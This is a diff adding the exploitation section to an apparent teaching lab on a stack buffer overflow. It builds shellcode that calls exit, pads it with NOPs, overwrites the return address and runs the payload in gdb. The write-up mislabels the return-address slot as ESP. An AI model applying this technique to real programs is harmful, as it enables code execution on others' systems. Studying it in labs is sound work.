@@ -351,10 +351,60 @@ The contents of the `buffer` can be checked by
 The first 8 bytes (`0x41414141	0x42424242`) are the buffer's contents.
 The next 4 bytes (`0x43434343`) is the base pointer.
 The next 4 bytes (`0x44444444`) is the return address which will be modified to point to the address of the `buffer` (at `0xffffcd18`).
+This is where the shellcode will be stored.
 
 ### Exploitation
 
+We can use any means necessary to send raw bytes to the input, but to make things simpler, we will be using `echo`.
+Notice that the structure of the memory address is as follows:
+
+```
+[ 0x-------- 0x-------- ] [ 0x-------- ] [ 0x-------- ] ...
+          buffer                ebp           esp
+```
+
+The payload `\x31\xc0\x40\x89\xc3\xcd\x80` can be stored on the `buffer`'s memory space
+
+```
+[ 0x8940c031 0x--80cdc3 ] [ 0x-------- ] [ 0x-------- ] ...
+          buffer                ebp           esp
+```
+
+Notice that the raw bytes are stored in little-endian system.
+
+Since the size of the payload is only 7 bytes long, NOP (no operation) instruction must be appended in order for the return address (ESP) to be modified.
+The total size of the buffer and the EBP is 12 bytes.
+Thus, there are 5 bytes worth of NOPs to be padded.
+
+```
+[ 0x8940c031 0x9080cdc3 ] [ 0x90909090 ] [ 0x-------- ] ...
+          buffer                ebp           esp
+```
+
+The equivalent shellcode is now `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90`.
+
+Next is to add the memory address of the `buffer`.
+
+```
+[ 0x8940c031 0x9080cdc3 ] [ 0x90909090 ] [ 0xffffcd18 ] ...
+          buffer                ebp           esp
+```
+
+Thus, the final shellcode is `\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff`.
+
 ## Documentation of Proofs
+
+To execute the exploit, run
+
+```
+(gdb) run <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
+```
+
+Which should successfully terminate the program with desired exit status
+
+```
+[Inferior 1 (process 1075597) exited with code 01]
+```
 
 ---
 
